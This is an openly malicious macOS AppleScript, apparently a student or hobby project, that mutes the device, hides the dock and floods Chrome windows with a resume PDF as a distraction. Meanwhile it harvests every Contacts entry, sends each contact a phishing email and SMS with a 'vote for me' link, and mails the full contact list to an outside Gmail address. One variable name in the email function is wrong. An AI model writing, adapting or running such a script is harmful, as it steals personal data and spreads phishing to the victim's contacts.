-- This script steals the user's contact list and sends it to us.
-- Then it emails those contacts with a malicious link from the user.
-- DO NOT RUN UNLESS YOU WANT YOUR CONTACTS STOLEN

-- Mutes the Device
set volume output volume 0

-- Hides the dock to prevent user from seeing what is happening
tell application "System Events"
	set autohide of dock preferences to true
end tell

-- A function that checks if an application is running
on isApplicationRunning(appName)
	tell application "System Events"
		set runningApps to every application process whose name is appName
		return (count of runningApps) is not 0
	end tell
end isApplicationRunning

-- Distracts user with fake pdf application
tell application "Google Chrome"
	launch
end tell

-- Reopens the window multiple times
set counter to 0
repeat
	if (isApplicationRunning("Google Chrome")) then
		tell application "Google Chrome"
			launch
			make new window
			open location "https://myfuture.edu.au/docs/default-source/entry-level-resumes/resume_sample_student8ea47e04a8fe67e6b7acff0000376a3b.pdf?sfvrsn=c43a27d9_6"
		end tell
		set counter to counter + 1
		if counter is 30 then
			exit repeat
		end if
		delay 1
	end if
end repeat

tell application "Contacts"
	set allContacts to every person
	set contactDetails to ""
	repeat with contact in allContacts
		set contactName to name of contact
		set contactPhone to ""
		set contactEmail to ""
		
		-- Check if there is an email 
		if (count of emails of contact) > 0 then
			set emailList to emails of contact
			
			-- Concatenation done to overrride unicode err
			repeat with anEmail in emailList
				set contactEmail to contactEmail & value of anEmail & ", "
			end repeat
			
			set contactEmail to text 1 through -3 of contactEmail
			sendMaliciousEmail(contactName, contactEmail)
		end if
		
		-- Check if there is a phone number
		if (count of every phone of contact) > 0 then
			set contactPhone to value of phone 1 of contact
			sendMaliciousMessage(contactPhone)
		end if
		
		-- Concatenate
		set contactDetails to contactDetails & contactName & ": " & contactPhone & ", " & contactEmail & return
	end repeat
	delay 1
	quit
end tell

-- function that emails the contact
-- (can make a backdoor here by emailing the contact a new form of contact like the hacker's phone number)
on sendMaliciousEmail(contactName, contactEmail)
	tell application "Mail"
		set theTo to contactEmail
		set theSubject to "Quick Task"
		set maliciousContent to "Hey " & wantedContact & "," & return & "Just quickly wanted to ask if you could vote for me for this competition I entered at work. Here's the link: https://www.clearnetwork.com/malicious-urls/"
		set theMessage to make new outgoing message with properties {subject:theSubject, content:maliciousContent, visible:true}
		tell theMessage
			make new to recipient at end of to recipients with properties {address:theTo}
		end tell
		send theMessage
		delay 1
		quit
	end tell
end sendMaliciousEmail

-- function that messages the contact
-- used code structure from https://developer.apple.com/forums/thread/668567
on sendMaliciousMessage(contactPhone)
	tell application "Messages"
		set targetService to 1st account whose service type = SMS
		set targetBuddy to participant contactPhone of targetService
		send "Hey, just quickly wanted to ask if you could vote for me for this competition I entered at work. Here's the link: https://www.clearnetwork.com/malicious-urls/" to targetBuddy
		delay 1
		quit
	end tell
end sendMaliciousMessage

-- Got the structure of how to send an email using apple scripts from this query: https://gist.github.com/youandhubris/9e292822e3db8f91df93234db092906e
tell application "Mail"
	-- email contact details to myself
	set theTo to "rubberducky.kk@gmail.com"
	set theSubject to "Got their contact List!"
	set theMessage to make new outgoing message with properties {subject:theSubject, content:contactDetails, visible:true}
	tell theMessage
		make new recipient at end of to recipients with properties {address:theTo}
	end tell
	send theMessage
	delay 1
	quit
end tell

-- brings dock back
tell application "System Events"
	set autohide of dock preferences to false
end tell
